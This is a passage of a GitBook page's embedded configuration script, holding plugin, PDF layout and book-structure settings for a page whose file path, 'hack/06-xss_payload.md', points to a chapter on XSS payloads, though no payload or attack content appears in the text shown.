HH:mm:ss"},"livereload":{},"search":{},"lunr":{"maxIndexSize":200000},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"back-to-top-button":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"hack/06-xss_payload.md","mtime":"2020-06-13T07:38:27.589Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-06-16T02:03:04.857Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
